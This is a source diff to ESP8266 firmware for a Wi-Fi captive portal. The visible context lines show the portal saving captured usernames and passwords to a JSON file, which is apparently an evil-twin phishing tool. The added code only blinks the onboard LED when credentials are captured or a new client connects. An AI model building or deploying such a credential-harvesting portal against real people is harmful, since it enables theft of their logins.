@@ -11,8 +11,25 @@
 namespace
 {
   constexpr byte DNS_PORT = 53;
+  constexpr uint8_t boardLedPin = LED_BUILTIN;
+  constexpr uint8_t blinkCountPerEvent = 5;
+  constexpr unsigned long blinkOnMs = 120;
+  constexpr unsigned long blinkOffMs = 120;
   constexpr const char *capturedCredentialsPath = "/captured_credentials.json";
   DNSServer dnsServer;
+
+  void blinkBoardLed(uint8_t times)
+  {
+    pinMode(boardLedPin, OUTPUT);
+
+    for (uint8_t i = 0; i < times; i++)
+    {
+      digitalWrite(boardLedPin, LOW); // ESP8266 onboard LED is active-low.
+      delay(blinkOnMs);
+      digitalWrite(boardLedPin, HIGH);
+      delay(blinkOffMs);
+    }
+  }
 
   void applyCaptivePortalDnsState()
   {
@@ -664,6 +681,8 @@ namespace
       return;
     }
 
+    blinkBoardLed(blinkCountPerEvent);
+
     bool saved = appendCapturedCredential(username, password);
 
     String page = R"rawliteral(
@@ -1010,6 +1029,18 @@ void initWiFiAndPortal()
 void handlePortalClient()
 {
   server.handleClient();
+
+  static uint8_t lastApClientCount = 0;
+  uint8_t currentApClientCount = WiFi.softAPgetStationNum();
+  if (currentApClientCount > lastApClientCount)
+  {
+    uint8_t newClients = currentApClientCount - lastApClientCount;
+    for (uint8_t i = 0; i < newClients; i++)
+    {
+      blinkBoardLed(blinkCountPerEvent);
+    }
+  }
+  lastApClientCount = currentApClientCount;
 
   if (captivePortalEnabled)
   {
